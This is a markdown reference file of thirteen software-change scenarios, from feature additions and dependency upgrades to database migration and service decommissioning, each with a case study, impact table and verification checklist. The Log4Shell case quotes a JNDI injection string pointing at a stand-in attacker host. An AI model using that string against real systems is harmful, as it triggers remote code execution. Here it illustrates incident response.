---
version: 3
last_updated: "2026-03-31"
source: bundled-domain-baseline
status: established
---

# Software Engineering Domain — Extension Cases

Classification axis: **change trigger** — cases classified by the type of change that triggers structural evolution. Cases cover both growth triggers (Cases 1–11) and shrinkage triggers (Cases 12–13).

The evolution agent simulates each scenario to verify whether the existing structure breaks.

---

## Case 1: Adding a New Feature

### Situation

Adding new functionality to an existing module structure without violating module boundaries or breaking existing code (Open-Closed Principle).

### Case Study: Slack — Huddles (2021)

Slack added real-time audio (Huddles) to an asynchronous text messaging platform. Audio requires WebRTC connections and media servers — fundamentally different infrastructure from HTTP-based messaging. Slack isolated Huddles in a separate module with its own data model, integrating with the existing workspace/channel model through defined interfaces. Existing messaging tests remained unaffected.

### Impact Analysis

| Principle | Impact |
|---|---|
| Module boundaries | New feature should map to a new module or extend an existing one via its public interface |
| Dependency direction | New module must depend inward, not introduce reverse dependencies |
| Test isolation | Existing test suites must pass without modification |
| API surface | Public API additions must be backward compatible (new endpoints, optional fields) |

### Verification Checklist

- [ ] Can the feature be added as a new module without modifying existing modules? → concepts.md §Architecture Core Terms ([L2] OCP)
- [ ] Existing tests pass without modification → logic_rules.md §Testing Logic
- [ ] New module follows dependency direction rules → dependency_rules.md §Direction Rules
- [ ] Public API changes are backward compatible → dependency_rules.md §API Dependency Management (Breaking vs Non-breaking Changes Classification)
- [ ] New dependencies do not create cycles → dependency_rules.md §Acyclic Dependencies
- [ ] Module size stays within thresholds → structure_spec.md §Quantitative Thresholds

### Affected Files

| File | Impact | Section |
|---|---|---|
| structure_spec.md | Verify | §Required Module Structure Elements, §Architectural Patterns |
| dependency_rules.md | Verify | §Direction Rules, §Acyclic Dependencies |
| logic_rules.md | Verify | §Testing Logic, §Inter-module Contract Logic |
| concepts.md | Potential | New terms if the feature introduces new domain concepts |

---

## Case 2: External Dependency Change

### Situation

Major version upgrade of a library or framework, potentially changing API signatures or removing deprecated features.

### Case Study: React — Class Components to Hooks (2019)

React 16.8 replaced class component state management (`this.state`, lifecycle methods, HOCs) with Hooks (`useState`, `useEffect`). Organizations with thousands of class components (Airbnb: 30,000+) faced multi-year migrations. Codebases with container/presenter separation could migrate independently; tightly coupled codebases required file-by-file rewrites. Tests using enzyme's class-specific shallow rendering broke entirely.

### Impact Analysis

| Principle | Impact |
|---|---|
| Abstraction layer | Direct coupling to library means every call site is affected |
| API surface | Changed signatures require updating all callers or writing adapters |
| Test suite | Tests using library-specific APIs may break |
| Migration path | Old and new patterns must coexist during migration |

### Verification Checklist

- [ ] Is internal code abstracted via interfaces or directly coupled? → dependency_rules.md §Direction Rules (DIP)
- [ ] Can the impact scope be determined when API signatures change? → dependency_rules.md §Referential Integrity
- [ ] Does a migration path exist allowing old/new coexistence? → concepts.md §Change Management Terms (Branch-by-Abstraction)
- [ ] Are tests dependent on library internals? → logic_rules.md §Testing Logic (Test Independence)
- [ ] Are transitive dependencies affected? → dependency_rules.md §Build/Package Dependency Rules (Transitive Dependency Management)
- [ ] Is the lock file updated and committed? → dependency_rules.md §Build/Package Dependency Rules (Lock File Management)

### Affected Files

| File | Impact | Section |
|---|---|---|
| dependency_rules.md | Modify | §External Dependency Management, §Build/Package Dependency Rules |
| structure_spec.md | Verify | §Required Relationships |
| logic_rules.md | Verify | §Testing Logic, §Type System Logic |
| concepts.md | Verify | §Change Management Terms |

---

## Case 3: Schema/Data Model Change

### Situation

Adding, removing, or changing fields in an existing data model. Identifier format changes have especially broad impact on referential integrity.

### Case Study: Twitter — Snowflake ID Migration (2010)

Twitter migrated from MySQL auto-increment IDs to Snowflake, a distributed 64-bit ID system encoding timestamp, machine ID, and sequence. Auto-increment required a centralized database — unsustainable at 400M+ tweets/day. The migration required: changing all ID columns from 32-bit to 64-bit, updating every API endpoint and foreign key, verifying JavaScript compatibility (fits within `Number.MAX_SAFE_INTEGER`). A dual-write period allowed both formats to coexist.

### Impact Analysis

| Principle | Impact |
|---|---|
| Type system | Field type changes propagate to all consumers |
| Referential integrity | Identifier format changes affect every foreign key and cross-service reference |
| API compatibility | Response format changes are breaking for existing consumers |
| Source of truth | During migration, two systems coexist — source of truth must be declared |

### Verification Checklist

- [ ] Does the migration preserve existing data? → structure_spec.md §Storage/Data Layer
- [ ] Does all code referencing the model accommodate the change? → dependency_rules.md §Referential Integrity
- [ ] Is API response backward compatibility maintained? → dependency_rules.md §API Dependency Management (Breaking vs Non-breaking Changes Classification)
- [ ] Are database constraints updated? → logic_rules.md §Constraint Design Logic (Database vs Application Constraint Boundary)
- [ ] Is the migration reversible and idempotent? → concepts.md §Data/State Management Terms (Migration)
- [ ] Is schema-code alignment verified? → structure_spec.md §Golden Relationships (Schema-Code alignment)
- [ ] Is source of truth designated during dual-write? → dependency_rules.md §Source of Truth Management

### Affected Files

| File | Impact | Section |
|---|---|---|
| logic_rules.md | Modify | §Type System Logic, §Constraint Design Logic |
| dependency_rules.md | Verify | §Referential Integrity, §API Dependency Management |
| structure_spec.md | Verify | §Storage/Data Layer, §Golden Relationships |

---

## Case 4: Scale Expansion

### Situation

10x increase in users, data, or traffic. Bottlenecks emerge at synchronous processing, shared state, and single-instance resources.

### Case Study: Netflix — Monolith to Microservices (2012–2016)

Netflix migrated from a monolithic Java application to 700+ microservices on AWS for 100M+ subscribers. The monolith's single database was a bottleneck, a single bug could crash everything, and deployments required all-team coordination. Key decisions: each service owns its data, inter-service calls use circuit breakers (Hystrix), eventual consistency accepted where appropriate. Netflix open-sourced Eureka (discovery), Zuul (gateway), Hystrix (circuit breaker). The migration proved microservices solve scaling but require heavy observability investment.

### Impact Analysis

| Principle | Impact |
|---|---|
| Module structure | Must support horizontal scaling (stateless or externalized state) |
| Shared state | Sessions, caches, in-memory state prevent scaling if not externalized |
| Database | Single database becomes bottleneck; read replicas, sharding, or per-service databases needed |
| Concurrency | Race conditions invisible at low scale manifest under load |

### Verification Checklist

- [ ] Can bottleneck points be identified? → structure_spec.md §Quantitative Thresholds
- [ ] Is the structure capable of horizontal scaling? → structure_spec.md §Architectural Patterns
- [ ] Does shared state impede scaling? → logic_rules.md §State Management Logic (Distributed State Rules)
- [ ] Are concurrency issues addressed? → logic_rules.md §Concurrency Logic
- [ ] Are circuit breakers in place? → dependency_rules.md §Runtime Dependency Rules (Circuit Breaker)
- [ ] Are timeout and retry policies configured? → dependency_rules.md §Runtime Dependency Rules (Timeout and Retry Policies)
- [ ] Is observability sufficient? → domain_scope.md §Required Concept Categories (Observability)

### Affected Files

| File | Impact | Section |
|---|---|---|
| structure_spec.md | Modify | §Architectural Patterns, §Quantitative Thresholds |
| dependency_rules.md | Verify | §Runtime Dependency Rules |
| logic_rules.md | Verify | §Concurrency Logic, §State Management Logic |
| domain_scope.md | Verify | §Required Concept Categories |

---

## Case 5: New Deployment Environment

### Situation

Adding a new deployment target (on-premises → cloud, single-region → multi-region, bare metal → Kubernetes).

### Case Study: Shopify — Multi-tenant Kubernetes (2019–2021)

Shopify migrated from single-tenant bare-metal to multi-tenant Kubernetes for 1.7M+ merchants. Per-merchant infrastructure was expensive and couldn't handle Black Friday spikes. Migration required: separating configuration into ConfigMaps/Secrets, abstracting file system access (local disk → object storage), pod autoscaling for 10x traffic. Critical refactor: hardcoded "one database per tenant" became a routing layer directing queries by tenant ID.

### Impact Analysis

| Principle | Impact |
|---|---|
| Configuration separation | Environment-specific values must not be in code |
| Infrastructure abstraction | OS-specific and platform-specific code must be abstracted |
| Deployment pipeline | CI/CD must support multiple targets with environment-specific stages |
| Data locality | Multi-region introduces data replication and latency considerations |

### Verification Checklist

- [ ] Are environment-specific settings separated from code? → structure_spec.md §Required Module Structure Elements (Configuration/Environment)
- [ ] Is environment-dependent code abstracted? → structure_spec.md §Golden Relationships (Config-Code separation)
- [ ] Are credentials managed via secrets, not hardcoded? → logic_rules.md §Security Logic (Authentication Logic)
- [ ] Does CI/CD support the new environment? → structure_spec.md §Verification Structure (CI/CD Pipeline Structure)
- [ ] Is 12-Factor App methodology followed? → domain_scope.md §Reference Standards/Frameworks
- [ ] Are multi-region data concerns addressed? → logic_rules.md §State Management Logic (Distributed State Rules)

### Affected Files

| File | Impact | Section |
|---|---|---|
| structure_spec.md | Modify | §Required Module Structure Elements, §Golden Relationships, §Verification Structure |
| dependency_rules.md | Verify | §External Dependency Management |
| logic_rules.md | Verify | §State Management Logic, §Security Logic |
| domain_scope.md | Verify | §Reference Standards/Frameworks |

---

## Case 6: Team/Organization Expansion

### Situation

Increase in developer count leading to higher concurrent work. Conway's Law: system architecture mirrors organizational structure.

### Case Study: Amazon — Two-Pizza Teams and SOA (2002–2006)

Bezos mandated all teams communicate through service interfaces — no direct database access, no shared memory. Teams of 6–10 people each owned a service end-to-end. This forced monolith decomposition into hundreds of services with well-defined APIs. Benefits: independent deployment (50+ deploys/day per team by 2011), clear ownership, limited blast radius. Costs: distributed complexity, eventual consistency. Amazon built internal tools, later released as AWS services (DynamoDB, SQS, CloudWatch).

### Impact Analysis

| Principle | Impact |
|---|---|
| Module boundaries | Must be clear enough for independent team work |
| Shared code | Changes to shared libraries must not block other teams |
| CI/CD pipeline | Must support parallel builds and per-team deployment |
| API contracts | Inter-team communication through contracts, not direct code sharing |

### Verification Checklist

- [ ] Are module boundaries clear enough for independent work? → structure_spec.md §Classification Criteria Design
- [ ] Do shared code changes not block other teams? → dependency_rules.md §Package/Module Dependency Patterns (Shared Kernel)
- [ ] Does CI/CD support parallel builds/tests? → structure_spec.md §Verification Structure (CI/CD Pipeline Structure)
- [ ] Are inter-module contracts explicitly defined? → logic_rules.md §Inter-module Contract Logic
- [ ] Is dependency fan-in within threshold (≤ 20)? → structure_spec.md §Quantitative Thresholds
- [ ] Is the dependency graph a DAG? → dependency_rules.md §Acyclic Dependencies

### Affected Files

| File | Impact | Section |
|---|---|---|
| structure_spec.md | Modify | §Classification Criteria Design, §Quantitative Thresholds |
| dependency_rules.md | Verify | §Acyclic Dependencies, §Package/Module Dependency Patterns |
| logic_rules.md | Verify | §Inter-module Contract Logic |

---

## Case 7: Event Sourcing Extension (when applicable)

### Situation

Adding new event types, states, and resume functionality to an Event Sourcing system.

### Case Study: Axon Framework — Event Upcasting at ING Bank

Axon Framework (AxonIQ) provides JVM-based Event Sourcing and CQRS for financial institutions. When ING added `FraudAlertRaised` to their payment pipeline: (1) projectors with catch-all handlers threw on unknown events, (2) the new `PaymentFrozen` terminal state required updating state machines that assumed `PaymentCompleted` was final, (3) old events needed compatibility with new code via `EventUpcaster` chains. Key lesson: adding an event type is a schema evolution affecting all historical data.

### Impact Analysis

| Principle | Impact |
|---|---|
| Event schema | New events must be forward-compatible with existing projectors |
| Terminal states | New terminal states affect all state machines and workflow logic |
| Replay safety | Historical events must be replayable with new projector code |
| Partial commit | Multiple events in one business operation must be atomic |

### Verification Checklist

- [ ] Do existing projectors safely handle unknown events? → logic_rules.md §Type System Logic (Fundamental Type Rules)
- [ ] Is handling defined for changed external inputs at resumption? → logic_rules.md §State Management Logic (Fundamental State Rules)
- [ ] Do touch points grow proportionally or remain fixed when adding stages? → structure_spec.md §Architectural Patterns
- [ ] Are new terminal states documented? → concepts.md §Data/State Management Terms (Terminal State)
- [ ] Is partial commit prevention addressed? → logic_rules.md §State Management Logic (Fundamental State Rules)
- [ ] Is event upcasting defined for schema evolution? → concepts.md §Data/State Management Terms (Migration)

### Affected Files

| File | Impact | Section |
|---|---|---|
| logic_rules.md | Modify | §State Management Logic, §Type System Logic |
| concepts.md | Verify | §Data/State Management Terms |
| structure_spec.md | Verify | §Architectural Patterns |
| dependency_rules.md | Verify | §Source of Truth Management |

---

## Case 8: Security Incident Response

### Situation

A security vulnerability is discovered in a dependency or the system itself. Supply chain vulnerabilities propagate through transitive dependencies.

### Case Study: Log4Shell — CVE-2021-44228 (December 2021)

Log4Shell was an RCE vulnerability in Apache Log4j 2, allowing code execution via crafted log message strings (`${jndi:ldap://attacker.com/exploit}`). Log4j was a transitive dependency in millions of applications — most teams didn't know they used it. Response required: scanning dependency trees 3-4 levels deep, identifying vulnerable versions (2.0-beta9 through 2.14.1), patching while maintaining compatibility, generating SBOMs for future visibility. Organizations with mature dependency management responded in hours; others took weeks.

### Impact Analysis

| Principle | Impact |
|---|---|
| Dependency visibility | Transitive dependencies must be enumerable |
| Supply chain | Integrity must be verifiable via checksums and signatures |
| Patch propagation | A library fix must propagate to all consuming applications |
| Test regression | Patching may change behavior — tests must verify no regressions |

### Verification Checklist

- [ ] Can all instances of the vulnerable dependency be identified, including transitive? → dependency_rules.md §Build/Package Dependency Rules (Transitive Dependency Management)
- [ ] Is dependency audit running in CI? → dependency_rules.md §Build/Package Dependency Rules (Dependency Security)
- [ ] Are lock files committed and current? → dependency_rules.md §Build/Package Dependency Rules (Lock File Management)
- [ ] Is SBOM generated? → dependency_rules.md §Build/Package Dependency Rules (Dependency Security)
- [ ] Are defense-in-depth layers operational? → logic_rules.md §Security Logic (Input Validation Logic)
- [ ] Are downstream consumers notified? → dependency_rules.md §External Dependency Management

### Affected Files

| File | Impact | Section |
|---|---|---|
| dependency_rules.md | Modify | §Build/Package Dependency Rules, §External Dependency Management |
| logic_rules.md | Verify | §Security Logic |
| structure_spec.md | Verify | §Verification Structure (CI/CD Pipeline Structure) |
| domain_scope.md | Verify | §Major Sub-areas > Security & Auth |

---

## Case 9: API Versioning / Breaking Change

### Situation

A widely-used API needs breaking changes while existing consumers cannot all upgrade immediately.

### Case Study: Stripe — Date-Based API Versioning

Stripe pins each merchant to the API version at integration time (e.g., `2023-10-16`). Breaking changes only affect newer versions. Compatibility is maintained via "version transformers" — middleware translating between the current internal representation and each API version. Setting `Stripe-Version: 2020-08-27` routes responses through transformers undoing changes after that date. This avoids the "upgrade cliff" but accumulates complexity: each breaking change requires a bidirectional transformer tested against all active versions.

### Impact Analysis

| Principle | Impact |
|---|---|
| Consumer enumeration | All consumers must be identified before breaking changes |
| Migration path | Consumers need clear, documented upgrade instructions |
| Backward compatibility | Old versions must continue working for a defined period |
| Contract testing | Each supported version must be tested for correct behavior |

### Verification Checklist

- [ ] Are all consumers of the affected API enumerated? → dependency_rules.md §Referential Integrity
- [ ] Is the change classified as breaking or non-breaking? → dependency_rules.md §API Dependency Management (Breaking vs Non-breaking Changes Classification)
- [ ] Is a versioning strategy selected? → dependency_rules.md §API Dependency Management (REST API Versioning Strategies)
- [ ] Is backward compatibility maintained for the deprecation period? → concepts.md §Change Management Terms (Deprecation)
- [ ] Are contract tests in place? → concepts.md §Testing Terms ([L3] Contract Test)
- [ ] Are gRPC/GraphQL evolution rules followed if applicable? → dependency_rules.md §API Dependency Management

### Affected Files

| File | Impact | Section |
|---|---|---|
| dependency_rules.md | Modify | §API Dependency Management, §Referential Integrity |
| logic_rules.md | Verify | §Type System Logic, §Inter-module Contract Logic |
| concepts.md | Verify | §Change Management Terms |
| structure_spec.md | Verify | §Golden Relationships (Documentation-Code alignment) |

---

## Case 10: Monolith to Microservices Migration

### Situation

Decomposing a monolithic application into microservices (or choosing not to). The decision must be driven by concrete requirements, not trends.

### Case Study: Shopify — Modular Monolith (2019–2023)

Shopify's Rails monolith serves 1.7M+ merchants ($444B+ GMV). Rather than microservices, they chose a modular monolith with Packwerk (static analysis enforcing module boundaries). Each component has `public/` (API surface) and `private/` internals — cross-component communication through public API only. Rationale: microservices would add network latency, distributed transactions, and service mesh overhead. The modular monolith achieves independent development without distributed complexity.

### Impact Analysis

| Principle | Impact |
|---|---|
| Bounded contexts | Each service/module must align with a domain boundary |
| Data ownership | Each service must own its data; shared databases create distributed monoliths |
| Transaction boundaries | Cross-service operations require sagas or eventual consistency |
| Testing strategy | Integration tests become cross-service; E2E requires service orchestration |

### Verification Checklist

- [ ] Are bounded contexts identified via domain analysis? → concepts.md §Architecture Core Terms (Bounded Context)
- [ ] Are module/service boundaries enforced? → structure_spec.md §Architectural Patterns (Modular Monolith)
- [ ] Does each service own its data exclusively? → structure_spec.md §Storage/Data Layer
- [ ] Are cross-service transactions handled via sagas? → logic_rules.md §State Management Logic (Saga Pattern)
- [ ] Is inter-service communication through defined APIs? → logic_rules.md §Inter-module Contract Logic
- [ ] Are anti-corruption layers in place? → dependency_rules.md §Package/Module Dependency Patterns (Anti-corruption Layer)
- [ ] Is the dependency graph a DAG at the service level? → dependency_rules.md §Acyclic Dependencies
- [ ] Are circuit breakers configured? → dependency_rules.md §Runtime Dependency Rules (Circuit Breaker)

### Affected Files

| File | Impact | Section |
|---|---|---|
| structure_spec.md | Modify | §Architectural Patterns, §Classification Criteria Design |
| dependency_rules.md | Modify | §Runtime Dependency Rules, §Package/Module Dependency Patterns |
| logic_rules.md | Verify | §State Management Logic, §Inter-module Contract Logic |
| concepts.md | Verify | §Architecture Core Terms |
| domain_scope.md | Verify | §Major Sub-areas > Structure & Architecture |

---

## Case 11: Database Migration

### Situation

Migrating from one database system to another while guaranteeing zero data loss.

### Case Study: GitHub — MySQL to Vitess (2018–2020)

GitHub migrated to Vitess (clustering system from YouTube) for 5B+ API requests/day across 1,200+ MySQL hosts. MySQL's single-primary replication limited write scalability; schema migrations on 100M+ row tables took hours. Vitess provides horizontal sharding, connection pooling, and online schema migrations (gh-ost). Strategy: (1) deploy Vitess as proxy (no app changes), (2) remove cross-shard joins, (3) enable sharding for high-write tables, (4) dual-write with automated consistency checks. Zero data loss achieved by validating each step before cutover.

### Impact Analysis

| Principle | Impact |
|---|---|
| Data integrity | All data must be migrated without loss or corruption |
| Zero downtime | Migration must not require application downtime |
| Query compatibility | Application queries may need modification for new capabilities |
| Schema differences | New database may not support all features (triggers, stored procedures) |

### Verification Checklist

- [ ] Is data integrity verified via automated comparison? → dependency_rules.md §Referential Integrity
- [ ] Is a dual-write period implemented with consistency checks? → dependency_rules.md §Source of Truth Management
- [ ] Are all queries compatible with the new database? → structure_spec.md §Storage/Data Layer
- [ ] Is schema-code alignment verified? → structure_spec.md §Golden Relationships (Schema-Code alignment)
- [ ] Are database constraints migrated? → logic_rules.md §Constraint Design Logic (Database vs Application Constraint Boundary)
- [ ] Is the migration reversible at each step? → concepts.md §Data/State Management Terms (Migration)
- [ ] Are connection strings in configuration, not code? → structure_spec.md §Golden Relationships (Config-Code separation)

### Affected Files

| File | Impact | Section |
|---|---|---|
| dependency_rules.md | Modify | §External Dependency Management, §Referential Integrity, §Source of Truth Management |
| structure_spec.md | Verify | §Storage/Data Layer, §Golden Relationships |
| logic_rules.md | Verify | §Constraint Design Logic |
| concepts.md | Verify | §Data/State Management Terms |

---

## Case 12: Feature Removal / Deprecation

### Situation

Removing an existing feature, including deprecation notice, migration path for consumers, dead code cleanup, and data retention/deletion decisions.

### Case Study: Google — Google Reader Shutdown (2013)

Google Reader served millions of RSS subscribers. Shutdown required: 6-month deprecation notice, Google Takeout data export for user data, API deprecation for third-party clients (Feedly, Reeder migrated 500K+ users in 3 months), redirects from old URLs. Key lesson: feature removal affects both direct users and API consumers differently.

### Impact Analysis

| Principle | Impact |
|---|---|
| Deprecation protocol | Must specify what, when, and replacement |
| Dead code cleanup | Removal must not break unrelated code paths |
| Data lifecycle | User data must be exported or archived before deletion |
| Consumer migration | API consumers need migration guides and timeline |

### Verification Checklist

- [ ] Is deprecation announced with timeline and replacement? → concepts.md §Change Management Terms (Deprecation)
- [ ] Are all consumers of the deprecated feature enumerated? → dependency_rules.md §Referential Integrity
- [ ] Is dead code fully removed (no conditional branches for removed feature)? → structure_spec.md §Isolated Node Prohibition
- [ ] Is user data handled (export, archive, deletion)? → domain_scope.md §Required Concept Categories (Lifecycle)
- [ ] Are feature flags for the removed feature cleaned up? → concepts.md §Change Management Terms (Feature Toggle)
- [ ] Are tests for the removed feature deleted to prevent confusion? → logic_rules.md §Testing Logic (Test Independence)

### Affected Files

| File | Impact | Section |
|---|---|---|
| concepts.md | Verify | §Change Management Terms (Deprecation, Feature Toggle) |
| dependency_rules.md | Verify | §Referential Integrity, §API Dependency Management |
| structure_spec.md | Verify | §Isolated Node Prohibition |

---

## Case 13: Service Decommissioning

### Situation

Permanently shutting down a service, including traffic drain, data archival, dependency cleanup, and DNS/routing removal.

### Case Study: AWS — SimpleDB Sunset (Gradual, 2012–)

AWS SimpleDB was superseded by DynamoDB. AWS approach: no new customers accepted, existing customers given multi-year migration window, DynamoDB migration guides published, SimpleDB API maintained read-only during transition, data export tools provided. Key lesson: decommissioning a service with external consumers requires years-long migration support.

### Impact Analysis

| Principle | Impact |
|---|---|
| Traffic drain | All consumers must be migrated before shutdown |
| Data archival | Data must be archived or migrated to successor service |
| Dependency cleanup | All references to the service must be removed |
| DNS/routing | Service endpoints must return informative errors, not timeouts |

### Verification Checklist

- [ ] Are all consumers identified and migrated? → dependency_rules.md §Referential Integrity
- [ ] Is data archived with retention policy? → domain_scope.md §Required Concept Categories (Lifecycle)
- [ ] Are inter-service dependencies cleaned up (no dangling references)? → dependency_rules.md §Acyclic Dependencies
- [ ] Are monitoring/alerts for the decommissioned service removed? → domain_scope.md §Required Concept Categories (Observability)
- [ ] Is DNS/routing updated (informative 410 Gone, not timeout)? → dependency_rules.md §API Dependency Management
- [ ] Is the decommissioned service removed from CI/CD pipelines? → structure_spec.md §Verification Structure (CI/CD Pipeline Structure)

### Affected Files

| File | Impact | Section |
|---|---|---|
| dependency_rules.md | Modify | §Referential Integrity, §External Dependency Management |
| structure_spec.md | Verify | §Verification Structure |
| domain_scope.md | Verify | §Required Concept Categories |

---

## Scenario Interconnections

Extension scenarios are not independent. Multiple scenarios often occur simultaneously or trigger each other.

| Scenario | Triggers / Interacts With | Reason |
|---|---|---|
| Case 1 (New Feature) | → Case 2 (Dependency) | New features often introduce new dependencies |
| Case 2 (Dependency) | → Case 8 (Security) | Dependency upgrades often triggered by vulnerabilities |
| Case 3 (Schema) | → Case 9 (API Breaking) | Data model changes propagate to API formats |
| Case 4 (Scale) | → Case 10 (Monolith→MS) | Scale beyond capacity triggers decomposition |
| Case 4 (Scale) | → Case 11 (DB Migration) | Scale may exceed database capabilities |
| Case 4 (Scale) | → Case 5 (Environment) | Scale requires multi-region or cloud |
| Case 6 (Team) | → Case 10 (Monolith→MS) | Team boundaries drive service boundaries (Conway's Law) |
| Case 7 (Event Sourcing) | → Case 3 (Schema) | New event types are event store schema changes |
| Case 8 (Security) | → Case 2 (Dependency) | Security patches require dependency upgrades |
| Case 9 (API Breaking) | → Case 1 (New Feature) | Breaking changes often accompany new features |
| Case 10 (Monolith→MS) | → Case 11 (DB Migration) | Service decomposition requires database splitting |
| Case 11 (DB Migration) | → Case 4 (Scale) | Database migrations often motivated by scale |

---

## Related Documents
- structure_spec.md — module structure, architectural patterns, verification structure, quantitative thresholds
- dependency_rules.md — dependency direction, API management, runtime dependencies, build/package dependencies
- logic_rules.md — type system, state management, constraint design, security, concurrency, testing logic
- domain_scope.md — concern areas, concept categories, reference standards
- concepts.md — term definitions for architecture, data/state, type system, change management
